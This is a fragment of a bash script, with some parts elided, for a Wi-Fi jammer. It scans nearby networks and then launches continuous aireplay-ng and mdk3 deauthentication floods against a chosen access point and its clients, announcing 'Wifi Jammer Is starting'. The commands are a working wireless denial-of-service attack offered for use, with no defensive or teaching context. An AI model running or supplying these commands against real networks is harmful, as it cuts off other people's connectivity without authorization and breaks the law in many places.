...
echo -e ""
iwlist wlan1 scan | GREP_COLOR='01;36' egrep --color=always 'ESSID\|Address\|Channel'
...
xterm -e airodump-ng wlan1mon &
xterm -e mdk3 wlan1mon d & 
xterm -e mdk3 wlan1mon d &
xterm -e mdk3 wlan1mon d &
else 
...
xterm -e airodump-ng -c $ch --bssid $bssid wlan1mon &
...
xterm -hold -e aireplay-ng -0 0 -a $bssid wlan1mon 
airmon-ng stop wlan1mon &>/dev/null 
service networking restart &>/dev/null &
service network-manager restart &>/dev/null & 
fi
...
echo -e "$green Wifi Jammer Is starting......$nc"
xterm -hold -e aireplay-ng -0 $seco -a $bssid wlan1mon 
airmon-ng stop wlan1mon &>/dev/null 
service networking restart &>/dev/null &
service network-manager restart &>/dev/null &
